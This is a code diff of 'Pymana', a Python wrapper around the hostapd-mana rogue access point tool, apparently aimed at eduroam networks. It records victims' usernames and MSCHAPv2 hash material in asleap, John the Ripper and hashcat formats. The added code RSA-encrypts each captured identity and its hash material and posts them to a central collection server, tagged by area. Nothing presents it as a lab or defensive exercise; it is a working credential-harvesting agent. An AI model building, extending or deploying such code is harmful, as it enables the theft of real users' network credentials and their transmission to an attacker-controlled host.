@@ -1,6 +1,7 @@
 import os
 import sys
 import subprocess
+import requests
 
 import time
 import json
@@ -8,45 +9,125 @@ import json
 import mmap
 import random
 
+from pathlib import Path
+from multiprocessing import Queue
+
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives import serialization, hashes
+from cryptography.hazmat.primitives.asymmetric import rsa, padding
+from cryptography.x509 import load_pem_x509_certificate
+
+# Load public key (certificate)
+with open("keys/apscavenge.pem", 'rb') as cert_file:
+    cert_data = cert_file.read()
+    cert = load_pem_x509_certificate(cert_data, default_backend())
+    public_key = cert.public_key()
+
+BASE_DIR = Path(__file__).resolve().parent
+
 g_iface = "wlan0"
 g_creds_file_name = "credentials"
 g_config_file_name = "eduroam"
+g_area = "none"
+g_central_ip = ""
+g_queue = None
 g_creds_file = None
 g_creds_dict = {}
 
-#def pymana_reload():
-    #sudo kill -SIGHUP $(pidof hostapd-mana)
-    #process = subprocess.Popen("sudo kill -HUP $(pidof hostapd-mana)", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, universal_newlines=True)
-    #process = subprocess.Popen("sudo ./hostapd-mana/hostapd/hostapd_cli set deny_mac_file hostapd.deny", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, universal_newlines=True)
-    #print("Pymana: Reloaded \"deny_mac_file\"")
+def public_key_encryption(data_dict):
+    global public_key
+    plaintext = json.dumps(data_dict).encode('utf-8')
+
+    # encrypt payload with public key
+    ciphertext = public_key.encrypt(
+        plaintext,
+        padding.OAEP(
+            mgf=padding.MGF1(algorithm=hashes.SHA256()),
+            algorithm=hashes.SHA256(),
+            label=None
+        )
+    )
+
+    return {'encrypted_data': ciphertext.decode('latin-1')}
+
+def post_seizure(email, asleap=None, jtr=None, hashcat=None):
+    global g_central_ip
+
+    # ensure the email is in utf-8 format
+    email = (email.encode().decode('unicode_escape').encode('latin1').decode())
+
+    try:
+        url = f'http://{g_central_ip}/seizure-api'
+        data = {'email': email}
+        #print(f"Request: {str(data)}")
+        response = requests.post(url, json=public_key_encryption(data))
+
+        #print(f'Response: status code {response.status_code} | content {response.content}')
+
+        #try:
+        #    content_dict = json.loads(response.content.decode("UTF-8"))
+        #    if 'email' in content_dict and 'already exists' not in content_dict['email']:
+        #        post_infohistory(email)
+                
+        #except ValueError as e:
+        #    #print(e)
+        #    print("(ERROR) APAgent: Response is not a valid json format")
+
+    except requests.exceptions.RequestException as e:
+        #print(e)
+        print('(ERROR) Pymana: Could not execute central request', flush=True)
+
+    post_infohistory(email, asleap, jtr, hashcat)
+
+def post_infohistory(email, asleap, jtr, hashcat):
+    global g_area, g_central_ip
+    try:
+        url = f'http://{g_central_ip}/infohistory-api'
+        data = {'seizure_email': email, 'area': g_area, 'asleap': asleap, 'jtr': jtr, 'hashcat': hashcat}
+        #print(f"Request: {str(data)}")
+        response = requests.post(url, json=public_key_encryption(data))
+
+        #print(f'Response: status code {response.status_code} | content {response.content}')
+
+    except requests.exceptions.RequestException as e:
+        #print(e)
+        print('(ERROR) Pymana: Could not execute central request', flush=True)
 
 def pymana_exec_cmd(cmd, cmd_msg, cmd_err):
-    print(f"Pymana: {cmd_msg}")
+    print(f"Pymana: {cmd_msg}", flush=True)
 
     try:
         process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, universal_newlines=True)
         
         # wait process to complete and capture output
         output, error = process.communicate()
-        print(output)
+        print(output, flush=True)
 
         # print any error
         if error:
-            print(error)
+            print(error, flush=True)
     except Exception as e:
-        print(f"(ERROR) Pymana {cmd_err}: {e}")
+        print(f"(ERROR) Pymana {cmd_err}: {e}", flush=True)
+
+def write_queue(msg):
+    global g_queue
+
+    if g_queue is not None:
+        g_queue.put(msg)
+    else:
+        print(f"(ERROR) Pymana multiprocess: Invalid queue", flush=True)
 
 def pymana_main(cmd):
     global g_iface, g_creds_file, g_creds_dict
 
     try:
         # print command being executed
-        print("=========================================================")
-        print("Pymana v0.2")
-        print(f"\nExecuting command:\n\"{cmd}\"")
-        print("=========================================================\n")
+        print("=========================================================", flush=True)
+        print("Pymana v0.3", flush=True)
+        print(f"\nExecuting command:\n\"{cmd}\"", flush=True)
+        print("=========================================================\n", flush=True)
 
-        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, universal_newlines=True)
+        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, universal_newlines=True, cwd=BASE_DIR)
 
         # start of hostapd-mana loop
         while True:
@@ -67,9 +148,13 @@ def pymana_main(cmd):
                 if 'handle_probe_req: send failed' in output:
                     raise KeyboardInterrupt
                 
+                # attack successfully started
+                if 'Using interface' in output:
+                    write_queue('Pymana started')
+                
                 #if (len(output_arr) < 8 and output_arr[0] != "wlan0:") or (len(output_arr) > 7 and output_arr[6] != "ACL:"):
                 if output_arr[0] != f"{g_iface}:" and ("ACL:" not in output) and ("handle_auth_cb:" not in output) and ("not allowed to authenticate" not in output):   # do not print unwanted lines
-                    print(output.strip())
+                    print(output.strip(), flush=True)
 
             # register usernames
             if output_arr[0] == "MANA" and output_arr[3] == "Phase" and output_arr[4] == "0:":
@@ -79,6 +164,8 @@ def pymana_main(cmd):
                     g_creds_file.seek(0)  # rewind
                     json.dump(g_creds_dict, g_creds_file, indent=4)
                     g_creds_file.truncate()
+
+                post_seizure(output_arr[5])
 
             # register hashed passwords
             elif output_arr[0] == "MANA" and output_arr[2] == "EAP-MSCHAPV2":
@@ -100,16 +187,18 @@ def pymana_main(cmd):
                 g_creds_file.truncate()
 
                 if len(g_creds_dict[username]) == 3:
+                    post_seizure(username, g_creds_dict[username][0], g_creds_dict[username][1], g_creds_dict[username][2])
+
                     if sys.getsizeof(g_creds_dict) > 1048576:    # 1MB
                         g_creds_dict.clear()
 
             # add MAC address to deny list after CREDENTIALS CAPTURE or after INVALID CERTIFICATE
             elif (len(output_arr) > 10 and output_arr[5] == "deauthenticated") or (len(output_arr) == 3 and output_arr[1] == "CTRL-EVENT-EAP-FAILURE"):
-                with open("hostapd.deny", "a+") as deny_file:
-                    if os.stat("hostapd.deny").st_size == 0 or mmap.mmap(deny_file.fileno(), 0, access=mmap.ACCESS_READ).find(output_arr[2].encode('utf-8')) == -1:
+                with open(BASE_DIR / "hostapd.deny", "a+") as deny_file:
+                    if os.stat(BASE_DIR / "hostapd.deny").st_size == 0 or mmap.mmap(deny_file.fileno(), 0, access=mmap.ACCESS_READ).find(output_arr[2].encode('utf-8')) == -1:
                         deny_file.write(f"{output_arr[2]}\n")
 
-                        print(f"Pymana: Added {output_arr[2]} MAC address to deny list")
+                        print(f"Pymana: Added {output_arr[2]} MAC address to deny list", flush=True)
                         
                 # reload hostapd-mana deny_mac_file
                 #pymana_exec_cmd("sudo ./hostapd-mana/hostapd/hostapd_cli set deny_mac_file hostapd.deny", "Reloading \"deny_mac_file\"...", "reload")
@@ -122,7 +211,7 @@ def pymana_main(cmd):
                 #if output_arr[5] == "deauthenticated":
 
                 # add device MAC address to deny list to prevent further connections
-                with open("hostapd.deny", "a") as deny_file:
+                with open(BASE_DIR / "hostapd.deny", "a") as deny_file:
                     deny_file.write(f"{output_arr[2]}\n")
 
                 print(f"Pymana: Added {output_arr[2]} MAC address to deny list")
@@ -136,21 +225,24 @@ def pymana_main(cmd):
 
         # get the return code of the command
         return_code = process.returncode
-        print(f"Command completed with return code: {return_code}")
+        print(f"Command completed with return code: {return_code}", flush=True)
+        write_queue('Pymana error')
 
     except KeyboardInterrupt:
-        print("\nKeyboardInterrupt: Ending script")
+        print("\nKeyboardInterrupt: Ending script", flush=True)
         process.terminate()
         process.wait()
+
+        write_queue('Pymana stopped')
         
-        print("Pymana: Terminated")
+        print("Pymana: Terminated", flush=True)
         return
     
 def edit_config_file():
     global g_iface, g_config_file_name
 
     try:
-        with open(g_config_file_name, "r+") as config_file:
+        with open(BASE_DIR / g_config_file_name, "r+") as config_file:
             file_contents = config_file.read()
 
             # add interface attribution in case the config file doesn't have it
@@ -173,15 +265,15 @@ def edit_config_file():
                     config_file.truncate()  # truncate any remaining content
 
     except FileNotFoundError:
-        print(f"(ERROR) Pymana: Config file '{g_config_file_name}' not found")
+        print(f"(ERROR) Pymana: Config file '{g_config_file_name}' not found", flush=True)
         return False
     
     return True
 
 def parse_arguments():
-    global g_iface, g_creds_file_name, g_config_file_name
+    global g_iface, g_creds_file_name, g_config_file_name, g_area, g_central_ip
 
-    print("Pymana: Parsing arguments...\n")
+    print("Pymana: Parsing arguments...\n", flush=True)
 
     cur_arg = ''
     for a in sys.argv:
@@ -194,17 +286,26 @@ def parse_arguments():
             #print(f"Reading attribute '{a}' for argument '{cur_arg}'")
             if cur_arg == 'iface':
                 g_iface = a
-                print(f"\tiface = {a}")
+                print(f"\tiface = {a}", flush=True)
             elif cur_arg == 'creds':
                 g_creds_file_name += f"-{a}"
-                print(f"\tcreds = {a}")
+                print(f"\tcreds = {a}", flush=True)
             elif cur_arg == 'conf':
                 g_config_file_name = a
-                print(f"\tconf = {a}")
+                print(f"\tconf = {a}", flush=True)
+            elif cur_arg == 'area':
+                g_area = a
+                print(f"\tarea = {a}", flush=True)
+            elif cur_arg == 'centralip':
+                g_central_ip = a
+                print(f"\tcentralip = {a}", flush=True)
+            #elif cur_arg == 'queueid':
+                #queue = Queue(int(a))
+                #print(f"\tqueueid = {a}")
 
             cur_arg = ''
 
-    print()
+    print(flush=True)
 
 def rand_hex():
     if random.randint(0, 1):
@@ -212,9 +313,22 @@ def rand_hex():
     
     return str(random.randint(0, 9))
 
-def main():
-    global g_iface, g_creds_file_name, g_config_file_name, g_creds_file, g_creds_dict
-    
+def main(iface_arg=None, creds_arg=None, conf_arg=None, agent_area_arg=None, central_ip_arg=None, queue_arg=None):
+    global g_iface, g_creds_file_name, g_config_file_name, g_area, g_central_ip, g_queue, g_creds_file, g_creds_dict
+
+    if iface_arg != None:
+        g_iface = iface_arg
+    if creds_arg != None:
+        g_creds_file_name += f"-{creds_arg}"
+    if conf_arg != None:
+        g_config_file_name = conf_arg
+    if agent_area_arg != None:
+        g_area = agent_area_arg
+    if central_ip_arg != None:
+        g_central_ip = central_ip_arg
+    if queue_arg != None:
+        g_queue = queue_arg
+
     parse_arguments()
 
     g_creds_file_name += ".json"
@@ -234,7 +348,7 @@ def main():
 
         # load credentials json file
         try:
-            g_creds_file = open(f"{g_creds_file_name}", "r+")
+            g_creds_file = open(f"/agentdata/{g_creds_file_name}", "r+") #g_creds_file = open(BASE_DIR / g_creds_file_name, "r+")
             try:
                 g_creds_dict = json.load(g_creds_file)
             # JSONDecodeError error, file can either be empty or not in json format
@@ -246,12 +360,14 @@ def main():
             if sys.getsizeof(g_creds_dict) > 1048576:    # 1MB
                 g_creds_dict.clear()
         except FileNotFoundError:
-            g_creds_file = open(f"{g_creds_file_name}", "w")
+            g_creds_file = open(f"/agentdata/{g_creds_file_name}", "w") #g_creds_file = open(BASE_DIR / g_creds_file_name, "w")
             json.dump({}, g_creds_file, indent=4)
 
         # execute hostapd-mana
         pymana_main(f"./hostapd-mana/hostapd/hostapd {g_config_file_name}")
         #pymana_main(f"hostapd-mana {g_config_file_name}")
+
+    write_queue('Pymana error')
 
 # main
 if __name__ == "__main__":
